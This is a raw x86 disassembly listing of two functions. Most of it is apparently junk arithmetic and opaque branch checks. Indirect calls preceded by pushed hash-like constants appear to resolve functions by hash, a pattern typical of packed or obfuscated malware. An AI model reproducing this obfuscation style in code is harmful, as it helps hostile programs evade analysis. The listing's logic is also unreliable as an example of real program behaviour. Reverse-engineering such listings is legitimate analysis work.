  42447c:	mov    edi,DWORD PTR [ebp-0x24]
  42447f:	sub    DWORD PTR [ebp-0x4c],edi
  424482:	add    esi,ebx
  424484:	and    esi,edx
  424486:	cmp    esi,DWORD PTR [ebp-0x10]
  424489:	jne    0x424495
  42448b:	sub    esi,eax
  42448d:	mov    ecx,DWORD PTR [ebp-0x18]
  424490:	sub    ecx,esi
  424492:	sub    DWORD PTR [ebp-0x24],ecx
  424495:	mov    eax,0x56
  42449a:	mov    esi,0xf6
  42449f:	add    esi,esi
  4244a1:	mov    DWORD PTR [ebp-0x40],esi
  4244a4:	add    eax,ecx
  4244a6:	sub    DWORD PTR [ebp-0x40],eax
  4244a9:	mov    esi,DWORD PTR [ebp-0x4c]
  4244ac:	cmp    esi,eax
  4244ae:	je     0x4244ca
  4244b0:	mov    edx,0x8b
  4244b5:	mov    edi,DWORD PTR [ebp-0x24]
  4244b8:	sub    edx,ecx
  4244ba:	and    edx,edi
  4244bc:	cmp    edx,DWORD PTR ds:0x438090
  4244c2:	je     0x4244ca
  4244c4:	add    DWORD PTR [ebp-0x4c],edx
  4244c7:	add    DWORD PTR [ebp-0x40],esi
  4244ca:	add    DWORD PTR [ebp-0x24],ecx
  4244cd:	xor    esi,esi
  4244cf:	xor    edi,edi
  4244d1:	or     DWORD PTR [ebp-0x24],esi
  4244d4:	add    DWORD PTR [ebp-0x4c],edi
  4244d7:	mov    edi,DWORD PTR [ebp-0x40]
  4244da:	test   edi,0x90
  4244e0:	je     0x4244f3
  4244e2:	mov    DWORD PTR [ebp-0x4c],ecx
  4244e5:	add    DWORD PTR [ebp-0x4c],ebx
  4244e8:	mov    esi,DWORD PTR [ebp-0x24]
  4244eb:	add    DWORD PTR [ebp-0x24],edi
  4244ee:	sub    esi,edx
  4244f0:	sub    DWORD PTR [ebp-0x4c],esi
  4244f3:	sub    ebx,esi
  4244f5:	sub    DWORD PTR [ebp-0x4c],ebx
  4244f8:	cmp    edx,0x45
  4244fb:	jne    0x424508
  4244fd:	cmp    esi,0xd7e6
  424503:	je     0x424508
  424505:	sub    DWORD PTR [ebp-0x4c],edx
  424508:	sub    edi,edx
  42450a:	mov    eax,DWORD PTR [ebp-0x40]
  42450d:	add    eax,ebx
  42450f:	and    eax,ebx
  424511:	cmp    esi,DWORD PTR ds:0x4380ac
  424517:	je     0x424531
  424519:	mov    edx,0x65
  42451e:	xor    DWORD PTR [ebp-0x4c],ebx
  424521:	sub    eax,ebx
  424523:	sub    DWORD PTR [ebp-0x4c],edi
  424526:	add    DWORD PTR [ebp-0x24],edx
  424529:	cmp    eax,DWORD PTR [ebp-0x18]
  42452c:	jne    0x424531
  42452e:	sub    DWORD PTR [ebp-0x4c],eax
  424531:	add    DWORD PTR [ebp-0x4c],eax
  424534:	cmp    eax,DWORD PTR [ebp-0x8]
  424537:	jne    0x4245c1
  42453d:	mov    edi,0xe3
  424542:	or     edi,esi
  424544:	or     edi,esi
  424546:	cmp    ecx,0x58
  424549:	jne    0x4245c1
  42454b:	mov    edx,0xe724
  424550:	xor    DWORD PTR [ebp-0x24],edi
  424553:	mov    edx,DWORD PTR [ebp-0x24]
  424556:	cmp    ecx,DWORD PTR [ebp-0x28]
  424559:	je     0x4245c1
  42455b:	mov    ebx,DWORD PTR [ebp-0x4c]
  42455e:	mov    edi,eax
  424560:	add    DWORD PTR [ebp-0x4c],edi
  424563:	and    edx,eax
  424565:	sub    edx,ebx
  424567:	test   edx,0x63
  42456d:	jne    0x4245c1
  42456f:	cmp    edx,DWORD PTR [ebp-0xc]
  424572:	je     0x4245c1
  424574:	mov    ecx,DWORD PTR [ebp-0x40]
  424577:	sub    DWORD PTR [ebp-0x4c],edx
  42457a:	mov    esi,eax
  42457c:	cmp    edx,DWORD PTR ds:0x438080
  424582:	jne    0x4245c1
  424584:	mov    eax,DWORD PTR ds:0x43804c
  42458a:	and    ecx,edx
  42458c:	sub    ecx,eax
  42458e:	sub    DWORD PTR [ebp-0x4c],esi
  424591:	mov    esi,DWORD PTR [ebp-0x24]
  424594:	test   esi,0x8e
  42459a:	jne    0x4245c1
  42459c:	and    ecx,edi
  42459e:	mov    DWORD PTR [ebp-0x24],edx
  4245a1:	cmp    ecx,0xa440a011
  4245a7:	jne    0x4245c1
  4245a9:	cmp    ecx,0xfffffff5
  4245ac:	je     0x4245c1
  4245ae:	or     DWORD PTR [ebp-0x4c],ecx
  4245b1:	cmp    esi,0x11
  4245b4:	jne    0x4245c1
  4245b6:	cmp    esi,0xa124
  4245bc:	jne    0x4245c1
  4245be:	add    DWORD PTR [ebp-0x40],esi
  4245c1:	and    ebx,edx
  4245c3:	mov    edi,DWORD PTR ds:0x438090
  4245c9:	mov    eax,esi
  4245cb:	cmp    ecx,DWORD PTR [ebp-0x18]
  4245ce:	jne    0x424600
  4245d0:	add    ebx,edx
  4245d2:	add    DWORD PTR [ebp-0x24],eax
  4245d5:	mov    ecx,DWORD PTR [ebp-0x40]
  4245d8:	mov    eax,DWORD PTR [ebp-0x24]
  4245db:	and    eax,esi
  4245dd:	cmp    ebx,0xfffffff6
  4245e0:	je     0x424600
  4245e2:	mov    esi,DWORD PTR [ebp-0x4c]
  4245e5:	sub    eax,edi
  4245e7:	or     ecx,eax
  4245e9:	xor    eax,eax
  4245eb:	sub    DWORD PTR [ebp-0x40],edi
  4245ee:	add    DWORD PTR [ebp-0x24],ebx
  4245f1:	sub    DWORD PTR [ebp-0x4c],ebx
  4245f4:	sub    DWORD PTR [ebp-0x40],ecx
  4245f7:	sub    DWORD PTR [ebp-0x4c],esi
  4245fa:	sub    DWORD PTR [ebp-0x40],edi
  4245fd:	mov    DWORD PTR [ebp-0x44],eax
  424600:	lea    eax,[ebp-0x3c]
  424603:	and    edx,edi
  424605:	add    DWORD PTR [ebp-0x24],esi
  424608:	sub    edx,eax
  42460a:	add    edx,ebx
  42460c:	xor    DWORD PTR [ebp-0x40],ebx
  42460f:	mov    esi,edi
  424611:	mov    ebx,DWORD PTR [ebp-0x4c]
  424614:	and    edx,esi
  424616:	test   eax,0x64
  42461b:	jne    0x424637
  42461d:	sub    DWORD PTR [ebp-0x4c],edx
  424620:	cmp    ebx,DWORD PTR [ebp-0x2c]
  424623:	je     0x424637
  424625:	sub    ebx,edx
  424627:	xor    edx,edx
  424629:	mov    edi,DWORD PTR [ebp-0x40]
  42462c:	sub    DWORD PTR [ebp-0x4c],edi
  42462f:	xor    DWORD PTR [ebp-0x24],ebx
  424632:	sub    edx,edi
  424634:	add    DWORD PTR [ebp-0x40],edx
  424637:	mov    edx,DWORD PTR ds:0x43805c
  42463d:	sub    ebx,ecx
  42463f:	mov    ecx,DWORD PTR [ebp-0x4c]
  424642:	mov    DWORD PTR [ebp-0x24],ecx
  424645:	or     DWORD PTR [ebp-0x24],edx
  424648:	sub    DWORD PTR [ebp-0x40],ebx
  42464b:	push   eax
  42464c:	mov    ecx,DWORD PTR [ebp-0x40]
  42464f:	mov    edi,DWORD PTR [ebp-0x4c]
  424652:	sub    ecx,ebx
  424654:	cmp    ecx,edi
  424656:	jne    0x424675
  424658:	sub    DWORD PTR [ebp-0x24],edi
  42465b:	or     ecx,eax
  42465d:	sub    ecx,edx
  42465f:	add    ecx,edx
  424661:	mov    ebx,DWORD PTR [ebp-0x24]
  424664:	add    ecx,ecx
  424666:	add    DWORD PTR [ebp-0x24],edx
  424669:	sub    DWORD PTR [ebp-0x4c],ecx
  42466c:	sub    ebx,edx
  42466e:	mov    edi,ecx
  424670:	and    edi,ebx
  424672:	or     DWORD PTR [ebp-0x24],edi
  424675:	push   0x36513a6c
  42467a:	xor    ebx,ebx
  42467c:	mov    esi,ebx
  42467e:	cmp    edi,0x6005
  424684:	jne    0x4246a4
  424686:	sub    esi,ebx
  424688:	sub    esi,edi
  42468a:	cmp    esi,0x2918
  424690:	je     0x4246a4
  424692:	mov    ebx,esi
  424694:	mov    edi,DWORD PTR [ebp-0x4c]
  424697:	add    DWORD PTR [ebp-0x40],ebx
  42469a:	sub    edi,eax
  42469c:	sub    DWORD PTR [ebp-0x40],eax
  42469f:	and    edi,esi
  4246a1:	and    DWORD PTR [ebp-0x40],edi
  4246a4:	cmp    ecx,0xa
  4246a7:	jne    0x4246f3
  4246a9:	mov    eax,DWORD PTR [ebp-0x40]
  4246ac:	mov    edx,ebx
  4246ae:	test   edx,0x325c
  4246b4:	je     0x4246f3
  4246b6:	cmp    edx,DWORD PTR ds:0x43804c
  4246bc:	je     0x4246f3
  4246be:	mov    edi,0xcf
  4246c3:	mov    ebx,DWORD PTR ds:0x438088
  4246c9:	cmp    eax,0x2c
  4246cc:	jne    0x4246f3
  4246ce:	add    DWORD PTR [ebp-0x40],eax
  4246d1:	add    edx,ecx
  4246d3:	mov    ecx,edx
  4246d5:	add    DWORD PTR [ebp-0x4c],ecx
  4246d8:	mov    eax,DWORD PTR ds:0x438078
  4246de:	xor    DWORD PTR [ebp-0x40],edi
  4246e1:	sub    eax,ecx
  4246e3:	and    DWORD PTR [ebp-0x24],edi
  4246e6:	test   eax,0xd4
  4246eb:	je     0x4246f3
  4246ed:	mov    DWORD PTR [ebp-0x1c],ebx
  4246f0:	or     DWORD PTR [ebp-0x40],eax
  4246f3:	call   0x424b76
  4246f8:	add    esi,edi
  4246fa:	mov    ecx,DWORD PTR [ebp-0x24]
  4246fd:	mov    eax,DWORD PTR [ebp-0x24]
  424700:	add    DWORD PTR [ebp-0x40],eax
  424703:	add    esi,edi
  424705:	test   esi,0x6d
  42470b:	jne    0x424797
  424711:	sub    esi,ebx
  424713:	cmp    ecx,DWORD PTR [ebp-0x4c]
  424716:	jne    0x424797
  424718:	add    ecx,eax
  42471a:	cmp    esi,0xffffffc5
  42471d:	jne    0x424797
  42471f:	sub    ecx,ebx
  424721:	mov    edi,eax
  424723:	mov    edx,DWORD PTR [ebp-0x24]
  424726:	sub    ecx,ebx
  424728:	add    DWORD PTR [ebp-0x24],eax
  42472b:	sub    ecx,eax
  42472d:	cmp    edx,0x84b4
  424733:	je     0x424797
  424735:	sub    DWORD PTR [ebp-0x40],edx
  424738:	cmp    ecx,0x14882200
  42473e:	je     0x424797
  424740:	cmp    eax,DWORD PTR [ebp-0x1c]
  424743:	jne    0x424797
  424745:	mov    ebx,DWORD PTR [ebp-0x24]
  424748:	cmp    ebx,edx
  42474a:	jne    0x424797
  42474c:	cmp    esi,ecx
  42474e:	jne    0x424797
  424750:	or     ebx,edi
  424752:	mov    edx,eax
  424754:	and    DWORD PTR [ebp-0x24],ecx
  424757:	cmp    edx,esi
  424759:	jne    0x424797
  42475b:	mov    eax,DWORD PTR [ebp-0x4c]
  42475e:	sub    DWORD PTR [ebp-0x40],eax
  424761:	or     DWORD PTR [ebp-0x4c],edx
  424764:	add    esi,ecx
  424766:	cmp    ebx,ecx
  424768:	jne    0x424797
  42476a:	cmp    ebx,eax
  42476c:	jne    0x424797
  42476e:	mov    ecx,DWORD PTR [ebp-0x40]
  424771:	cmp    ebx,DWORD PTR ds:0x438044
  424777:	je     0x424797
  424779:	mov    edi,0x9f
  42477e:	add    DWORD PTR [ebp-0x40],eax
  424781:	mov    DWORD PTR [ebp-0x24],edi
  424784:	mov    edx,DWORD PTR [ebp-0x24]
  424787:	and    ecx,edx
  424789:	or     DWORD PTR [ebp-0x40],ecx
  42478c:	sub    DWORD PTR [ebp-0x40],esi
  42478f:	sub    DWORD PTR [ebp-0x4c],eax
  424792:	or     ebx,ecx
  424794:	or     DWORD PTR [ebp-0x24],ebx
  424797:	mov    ebx,DWORD PTR [ebp-0x3c]
  42479a:	mov    edx,DWORD PTR [ebp-0x4c]
  42479d:	mov    ecx,esi
  42479f:	add    DWORD PTR [ebp-0x24],ecx
  4247a2:	xor    DWORD PTR [ebp-0x24],ebx
  4247a5:	cmp    edx,0x29
  4247a8:	je     0x4247bb
  4247aa:	mov    ecx,DWORD PTR [ebp-0x24]
  4247ad:	add    DWORD PTR [ebp-0x40],ecx
  4247b0:	cmp    edx,DWORD PTR ds:0x43805c
  4247b6:	je     0x4247bb
  4247b8:	or     DWORD PTR [ebp-0x24],edx
  4247bb:	shr    ebx,0x10
  4247be:	sub    DWORD PTR [ebp-0x4c],eax
  4247c1:	cmp    ebx,0x94f7
  4247c7:	jne    0x424a13
  4247cd:	test   ebx,0x73
  4247d3:	jne    0x424803
  4247d5:	mov    ecx,DWORD PTR [ebp-0x4c]
  4247d8:	xor    eax,eax
  4247da:	sub    eax,ecx
  4247dc:	sub    eax,edi
  4247de:	sub    DWORD PTR [ebp-0x40],edx
  4247e1:	cmp    eax,DWORD PTR ds:0x4380ac
  4247e7:	jne    0x424803
  4247e9:	test   eax,0x6a
  4247ee:	je     0x424803
  4247f0:	mov    esi,DWORD PTR [ebp-0x24]
  4247f3:	add    eax,ecx
  4247f5:	add    DWORD PTR [ebp-0x40],eax
  4247f8:	test   esi,0x47
  4247fe:	je     0x424803
  424800:	xor    DWORD PTR [ebp-0x4c],esi
  424803:	mov    ebx,0x95395db6
  424808:	mov    edx,0xa6f6
  42480d:	add    DWORD PTR [ebp-0x40],ebx
  424810:	sub    edx,ebx
  424812:	or     edx,ebx
  424814:	add    DWORD PTR [ebp-0x24],edx
  424817:	sub    ebx,DWORD PTR [ebp-0x3c]
  42481a:	sub    esi,eax
  42481c:	mov    edx,0x59
  424821:	add    edx,ecx
  424823:	mov    edi,DWORD PTR [ebp-0x40]
  424826:	sub    DWORD PTR [ebp-0x40],ebx
  424829:	sub    edx,edi
  42482b:	cmp    edx,DWORD PTR ds:0x438044
  424831:	jne    0x424844
  424833:	sub    esi,eax
  424835:	add    edx,ebx
  424837:	xor    edi,edi
  424839:	sub    edx,ecx
  42483b:	xor    DWORD PTR [ebp-0x24],esi
  42483e:	add    DWORD PTR [ebp-0x40],edx
  424841:	sub    DWORD PTR [ebp-0x40],edi
  424844:	call   ebx
  424846:	mov    edi,0xda
  42484b:	add    DWORD PTR [ebp-0x40],edi
  42484e:	mov    DWORD PTR [ebp-0x38],eax
  424851:	add    esi,esi
  424853:	mov    eax,DWORD PTR [ebp-0x4c]
  424856:	cmp    esi,DWORD PTR ds:0x438090
  42485c:	je     0x424899
  42485e:	mov    edi,0x9f
  424863:	mov    ecx,DWORD PTR [ebp-0x40]
  424866:	sub    eax,ebx
  424868:	cmp    eax,DWORD PTR [ebp-0x40]
  42486b:	jne    0x424899
  42486d:	mov    ebx,DWORD PTR [ebp-0x40]
  424870:	cmp    ecx,DWORD PTR ds:0x438078
  424876:	jne    0x424899
  424878:	sub    ebx,edi
  42487a:	add    ecx,esi
  42487c:	cmp    eax,edi
  42487e:	jne    0x424899
  424880:	sub    DWORD PTR [ebp-0x24],ecx
  424883:	mov    ecx,0x84048090
  424888:	xor    DWORD PTR [ebp-0x40],eax
  42488b:	mov    esi,0xa8680108
  424890:	sub    DWORD PTR [ebp-0x40],ebx
  424893:	xor    DWORD PTR [ebp-0x40],ecx
  424896:	add    DWORD PTR [ebp-0x24],esi
  424899:	mov    ecx,0x425960
  42489e:	mov    edx,DWORD PTR [ebp-0x40]
  4248a1:	cmp    edx,DWORD PTR ds:0x438088
  4248a7:	je     0x4248e4
  4248a9:	add    edx,eax
  4248ab:	cmp    ebx,DWORD PTR ds:0x43805c
  4248b1:	jne    0x4248e4
  4248b3:	sub    edx,ebx
  4248b5:	mov    ebx,edx
  4248b7:	add    ebx,ecx
  4248b9:	mov    edx,DWORD PTR [ebp-0x24]
  4248bc:	cmp    edx,0x3f
  4248bf:	jne    0x4248e4
  4248c1:	mov    edi,DWORD PTR [ebp-0x40]
  4248c4:	cmp    ebx,DWORD PTR ds:0x438078
  4248ca:	je     0x4248e4
  4248cc:	mov    esi,DWORD PTR [ebp-0x24]
  4248cf:	add    esi,edx
  4248d1:	mov    eax,0x70
  4248d6:	xor    DWORD PTR [ebp-0x4c],esi
  4248d9:	xor    DWORD PTR [ebp-0x4c],ebx
  4248dc:	add    edi,ecx
  4248de:	sub    DWORD PTR [ebp-0x4c],edi
  4248e1:	add    DWORD PTR [ebp-0x24],eax
  4248e4:	push   DWORD PTR [ebp-0x3c]
  4248e7:	push   0x94f86f32
  4248ec:	push   DWORD PTR [ebp-0x38]
  4248ef:	call   ecx
  4248f1:	mov    eax,DWORD PTR [ebp-0x4c]
  4248f4:	mov    ecx,DWORD PTR [ebp-0x4c]
  4248f7:	add    DWORD PTR [ebp-0x40],ecx
  4248fa:	cmp    ecx,eax
  4248fc:	je     0x424901
  4248fe:	sub    DWORD PTR [ebp-0x40],eax
  424901:	add    DWORD PTR [ebp-0x38],0x1
  424908:	mov    eax,DWORD PTR [ebp-0x4c]
  42490b:	mov    edx,DWORD PTR [ebp-0x40]
  42490e:	add    eax,esi
  424910:	sub    edx,ecx
  424912:	cmp    eax,0x70
  424915:	jne    0x42499c
  42491b:	sub    eax,ecx
  42491d:	add    edx,ecx
  42491f:	mov    edi,0xd5
  424924:	mov    esi,DWORD PTR [ebp-0x40]
  424927:	add    esi,edx
  424929:	test   eax,0xaf
  42492e:	je     0x42499c
  424930:	mov    ecx,DWORD PTR [ebp-0x24]
  424933:	xor    edx,edx
  424935:	add    DWORD PTR [ebp-0x40],edx
  424938:	and    eax,ebx
  42493a:	add    eax,esi
  42493c:	cmp    ecx,0xffffffb5
  42493f:	jne    0x42499c
  424941:	cmp    ecx,0xffffffea
  424944:	je     0x42499c
  424946:	mov    esi,DWORD PTR [ebp-0x24]
  424949:	or     DWORD PTR [ebp-0x24],eax
  42494c:	add    ecx,esi
  42494e:	mov    edx,DWORD PTR [ebp-0x4c]
  424951:	sub    DWORD PTR [ebp-0x40],edx
  424954:	add    DWORD PTR [ebp-0x4c],edi
  424957:	or     ecx,edi
  424959:	sub    ecx,edx
  42495b:	cmp    esi,DWORD PTR ds:0x43805c
  424961:	je     0x42499c
  424963:	and    ecx,edi
  424965:	test   ecx,0xd3ad
  42496b:	jne    0x42499c
  42496d:	cmp    ecx,0x61
  424970:	jne    0x42499c
  424972:	mov    esi,DWORD PTR [ebp-0x40]
  424975:	mov    edi,DWORD PTR [ebp-0x40]
  424978:	cmp    ecx,0xd73c
  42497e:	je     0x42499c
  424980:	cmp    esi,0x34
  424983:	jne    0x42499c
  424985:	add    DWORD PTR [ebp-0x40],esi
  424988:	mov    ebx,DWORD PTR [ebp-0x40]
  42498b:	mov    DWORD PTR [ebp-0x4c],ecx
  42498e:	add    DWORD PTR [ebp-0x24],ebx
  424991:	mov    ebx,DWORD PTR [ebp-0x4c]
  424994:	add    edi,eax
  424996:	sub    DWORD PTR [ebp-0x40],ebx
  424999:	mov    DWORD PTR [ebp-0x4c],edi
  42499c:	mov    eax,DWORD PTR [ebp-0x38]
  42499f:	mov    ecx,DWORD PTR [ebp-0x24]
  4249a2:	or     ecx,eax
  4249a4:	add    ecx,eax
  4249a6:	mov    ebx,DWORD PTR [ebp-0x4c]
  4249a9:	cmp    ebx,edi
  4249ab:	je     0x4249cd
  4249ad:	test   edx,0xe5
  4249b3:	je     0x4249cd
  4249b5:	sub    DWORD PTR [ebp-0x24],esi
  4249b8:	mov    esi,0xb4
  4249bd:	sub    DWORD PTR [ebp-0x4c],ebx
  4249c0:	sub    ecx,eax
  4249c2:	mov    edi,DWORD PTR [ebp-0x40]
  4249c5:	sub    DWORD PTR [ebp-0x4c],edi
  4249c8:	sub    esi,ecx
  4249ca:	sub    DWORD PTR [ebp-0x40],esi
  4249cd:	call   eax
  4249cf:	mov    esi,0xb3
  4249d4:	mov    edx,DWORD PTR [ebp-0x4c]
  4249d7:	sub    DWORD PTR [ebp-0x40],edx
  4249da:	add    DWORD PTR [ebp-0x40],esi
  4249dd:	and    DWORD PTR [ebp-0x40],eax
  4249e0:	cmp    edx,DWORD PTR ds:0x438080
  4249e6:	jne    0x424a13
  4249e8:	mov    esi,DWORD PTR [ebp-0x4c]
  4249eb:	mov    ebx,DWORD PTR [ebp-0x4c]
  4249ee:	cmp    esi,DWORD PTR ds:0x438090
  4249f4:	jne    0x424a13
  4249f6:	cmp    ebx,edx
  4249f8:	jne    0x424a13
  4249fa:	mov    edx,DWORD PTR [ebp-0x40]
  4249fd:	mov    eax,DWORD PTR [ebp-0x24]
  424a00:	add    DWORD PTR [ebp-0x4c],edi
  424a03:	add    DWORD PTR [ebp-0x4c],eax
  424a06:	add    edx,eax
  424a08:	and    DWORD PTR [ebp-0x40],edx
  424a0b:	add    esi,edi
  424a0d:	sub    DWORD PTR [ebp-0x4c],ebx
  424a10:	sub    DWORD PTR [ebp-0x24],esi
  424a13:	sub    DWORD PTR [ebp-0x40],ecx
  424a16:	sub    DWORD PTR [ebp-0x4c],eax
  424a19:	mov    DWORD PTR [ebp-0x4c],esi
  424a1c:	pop    edi
  424a1d:	xor    edx,edx
  424a1f:	add    DWORD PTR [ebp-0x40],edi
  424a22:	mov    ebx,edi
  424a24:	and    edx,esi
  424a26:	sub    DWORD PTR [ebp-0x4c],ebx
  424a29:	add    DWORD PTR [ebp-0x40],edx
  424a2c:	pop    esi
  424a2d:	cmp    esi,DWORD PTR [ebp-0x8]
  424a30:	jne    0x424a5e
  424a32:	cmp    esi,DWORD PTR [ebp-0x14]
  424a35:	jne    0x424a5e
  424a37:	xor    edx,edx
  424a39:	and    edx,edi
  424a3b:	mov    ebx,DWORD PTR [ebp-0x4c]
  424a3e:	or     DWORD PTR [ebp-0x40],eax
  424a41:	sub    ebx,edx
  424a43:	test   esi,0x43
  424a49:	jne    0x424a5e
  424a4b:	sub    ebx,esi
  424a4d:	sub    ebx,eax
  424a4f:	mov    ecx,DWORD PTR [ebp-0x4c]
  424a52:	mov    eax,DWORD PTR [ebp-0x40]
  424a55:	or     DWORD PTR [ebp-0x24],eax
  424a58:	add    DWORD PTR [ebp-0x40],ecx
  424a5b:	mov    DWORD PTR [ebp-0x24],ebx
  424a5e:	pop    ebx
  424a5f:	cmp    ebx,edi
  424a61:	je     0x424b6f
  424a67:	and    edx,ecx
  424a69:	sub    edx,ecx
  424a6b:	cmp    ebx,0x4e1a
  424a71:	jne    0x424b6f
  424a77:	cmp    edx,0xe017
  424a7d:	jne    0x424b6f
  424a83:	mov    eax,DWORD PTR [ebp-0x4c]
  424a86:	mov    ecx,DWORD PTR ds:0x438088
  424a8c:	or     edx,ecx
  424a8e:	add    DWORD PTR [ebp-0x4c],eax
  424a91:	test   edx,0x870d
  424a97:	je     0x424b6f
  424a9d:	xor    eax,eax
  424a9f:	test   ebx,0x46a01000
  424aa5:	jne    0x424b6f
  424aab:	and    eax,esi
  424aad:	mov    ecx,0xa7
  424ab2:	sub    DWORD PTR [ebp-0x40],edx
  424ab5:	add    ecx,esi
  424ab7:	and    DWORD PTR [ebp-0x24],ebx
  424aba:	sub    ecx,esi
  424abc:	add    ecx,esi
  424abe:	or     ecx,edi
  424ac0:	add    DWORD PTR [ebp-0x40],eax
  424ac3:	cmp    ecx,edi
  424ac5:	je     0x424b6f
  424acb:	mov    eax,DWORD PTR [ebp-0x24]
  424ace:	add    DWORD PTR [ebp-0x4c],eax
  424ad1:	xor    edx,edx
  424ad3:	sub    ecx,edi
  424ad5:	test   ebx,0x8
  424adb:	je     0x424b6f
  424ae1:	xor    eax,eax
  424ae3:	sub    edx,edi
  424ae5:	sub    eax,esi
  424ae7:	and    edx,esi
  424ae9:	sub    DWORD PTR [ebp-0x4c],edx
  424aec:	add    ecx,edx
  424aee:	mov    edx,0xa45821b6
  424af3:	add    ecx,ecx
  424af5:	cmp    edi,0x5a
  424af8:	jne    0x424b6f
  424afa:	mov    DWORD PTR [ebp-0x24],edx
  424afd:	test   ecx,0xf7
  424b03:	jne    0x424b6f
  424b05:	mov    edx,DWORD PTR ds:0x438060
  424b0b:	cmp    ecx,0xac82
  424b11:	jne    0x424b6f
  424b13:	cmp    eax,DWORD PTR ds:0x438044
  424b19:	jne    0x424b6f
  424b1b:	cmp    eax,0xffffff9a
  424b1e:	jne    0x424b6f
  424b20:	add    ecx,esi
  424b22:	sub    DWORD PTR [ebp-0x4c],eax
  424b25:	and    edx,eax
  424b27:	cmp    ebx,0x62
  424b2a:	jne    0x424b6f
  424b2c:	cmp    ecx,0x65
  424b2f:	je     0x424b6f
  424b31:	mov    eax,DWORD PTR ds:0x438080
  424b37:	cmp    edx,eax
  424b39:	je     0x424b6f
  424b3b:	cmp    edx,edi
  424b3d:	je     0x424b6f
  424b3f:	add    edx,edx
  424b41:	cmp    edx,eax
  424b43:	jne    0x424b6f
  424b45:	cmp    ecx,0xa00c
  424b4b:	jne    0x424b6f
  424b4d:	mov    DWORD PTR [ebp-0x40],ecx
  424b50:	xor    ecx,ecx
  424b52:	test   edx,0x3
  424b58:	je     0x424b6f
  424b5a:	mov    eax,edx
  424b5c:	mov    edx,0xff
  424b61:	add    DWORD PTR [ebp-0x40],eax
  424b64:	sub    edx,eax
  424b66:	add    DWORD PTR [ebp-0x24],edx
  424b69:	sub    DWORD PTR [ebp-0x4c],ebx
  424b6c:	sub    DWORD PTR [ebp-0x24],ecx
  424b6f:	leave  
  424b70:	ret    
  424b71:	int3   
  424b72:	int3   
  424b73:	int3   
  424b74:	int3   
  424b75:	int3   
  424b76:	push   ebp
  424b77:	mov    ebp,esp
  424b79:	sub    esp,0x4c
  424b7c:	mov    eax,DWORD PTR ds:0x438040
  424b82:	mov    ecx,eax
  424b84:	or     ecx,eax
  424b86:	mov    DWORD PTR [ebp-0x14],ecx
  424b89:	push   ebx
  424b8a:	mov    eax,DWORD PTR [ebp-0x14]
  424b8d:	or     DWORD PTR [ebp-0x14],eax
  424b90:	push   esi
  424b91:	sub    DWORD PTR [ebp-0x14],eax
  424b94:	push   edi
  424b95:	mov    eax,0x588d
  424b9a:	add    eax,ecx
  424b9c:	sub    DWORD PTR [ebp-0x14],eax
  424b9f:	xor    DWORD PTR [ebp-0x14],eax
  424ba2:	mov    DWORD PTR [ebp-0x28],0x7c202542
  424ba9:	sub    ecx,eax
  424bab:	add    ecx,eax
  424bad:	or     ecx,eax
  424baf:	mov    esi,DWORD PTR [ebp-0x14]
  424bb2:	mov    edi,DWORD PTR [ebp-0x14]
  424bb5:	test   esi,0x0
  424bbb:	jne    0x424bff
  424bbd:	add    ecx,eax
  424bbf:	cmp    esi,0xffffffd6
  424bc2:	jne    0x424bff
  424bc4:	mov    eax,DWORD PTR ds:0x438084
  424bca:	or     esi,eax
  424bcc:	cmp    esi,DWORD PTR [ebp-0x40]
  424bcf:	jne    0x424bff
  424bd1:	cmp    esi,0x623a
  424bd7:	jne    0x424bff
  424bd9:	add    ecx,ecx
  424bdb:	cmp    edi,0x51
  424bde:	je     0x424bff
  424be0:	sub    DWORD PTR [ebp-0x14],esi
  424be3:	mov    ebx,DWORD PTR [ebp-0x14]
  424be6:	mov    eax,DWORD PTR [ebp-0x14]
  424be9:	test   ebx,0x7a
  424bef:	je     0x424bff
  424bf1:	sub    edi,ebx
  424bf3:	sub    ecx,esi
  424bf5:	sub    DWORD PTR [ebp-0x14],ecx
  424bf8:	and    edi,eax
  424bfa:	and    edi,ebx
  424bfc:	sub    DWORD PTR [ebp-0x14],edi
  424bff:	call   0x4257f7
  424c04:	sub    ebx,eax
  424c06:	sub    ebx,eax
  424c08:	and    ebx,edi
  424c0a:	mov    ecx,DWORD PTR [ebp-0x14]
  424c0d:	mov    edx,0xd5
  424c12:	or     edx,esi
  424c14:	and    ecx,esi
  424c16:	sub    edx,edi
  424c18:	add    edx,esi
  424c1a:	cmp    edx,DWORD PTR ds:0x438050
  424c20:	jne    0x424c78
  424c22:	cmp    edi,0x73
  424c25:	je     0x424c78
  424c27:	mov    edi,esi
  424c29:	mov    esi,DWORD PTR [ebp-0x14]
  424c2c:	test   ecx,0x4b
  424c32:	jne    0x424c78
  424c34:	sub    DWORD PTR [ebp-0x14],edi
  424c37:	mov    edi,DWORD PTR [ebp-0x14]
  424c3a:	cmp    esi,0xa
  424c3d:	jne    0x424c78
  424c3f:	mov    DWORD PTR [ebp-0x14],ecx
  424c42:	mov    DWORD PTR [ebp-0x44],eax
  424c45:	sub    edi,esi
  424c47:	mov    ecx,DWORD PTR ds:0x438084
  424c4d:	and    ebx,edi
  424c4f:	sub    DWORD PTR [ebp-0x14],ecx
  424c52:	sub    DWORD PTR [ebp-0x14],edx
  424c55:	mov    edx,0xbc8b
  424c5a:	sub    ebx,esi
  424c5c:	or     DWORD PTR [ebp-0x14],ebx
  424c5f:	add    edx,ebx
  424c61:	test   edx,0xbe
  424c67:	jne    0x424c78
  424c69:	or     DWORD PTR [ebp-0x44],esi
  424c6c:	or     edx,ecx
  424c6e:	sub    edx,ecx
  424c70:	cmp    esi,0x55
  424c73:	je     0x424c78
  424c75:	and    DWORD PTR [ebp-0x44],edx
  424c78:	mov    DWORD PTR [ebp-0x18],eax
  424c7b:	cmp    eax,DWORD PTR ds:0x438050
  424c81:	je     0x424d29
  424c87:	mov    ecx,DWORD PTR ds:0x438074
  424c8d:	mov    edx,DWORD PTR [ebp-0x14]
  424c90:	sub    edx,esi
  424c92:	sub    edx,eax
  424c94:	cmp    ebx,DWORD PTR ds:0x438074
  424c9a:	jne    0x424d29
  424ca0:	or     edx,ebx
  424ca2:	cmp    ebx,DWORD PTR ds:0x438040
  424ca8:	jne    0x424d29
  424caa:	cmp    edx,DWORD PTR ds:0x438084
  424cb0:	je     0x424d29
  424cb2:	mov    eax,0x1c
  424cb7:	mov    esi,DWORD PTR ds:0x438074
  424cbd:	sub    DWORD PTR [ebp-0x14],esi
  424cc0:	cmp    edx,ecx
  424cc2:	jne    0x424d29
  424cc4:	mov    esi,DWORD PTR [ebp-0x14]
  424cc7:	xor    edi,edi
  424cc9:	sub    edx,esi
  424ccb:	cmp    esi,0xffffffed
  424cce:	jne    0x424d29
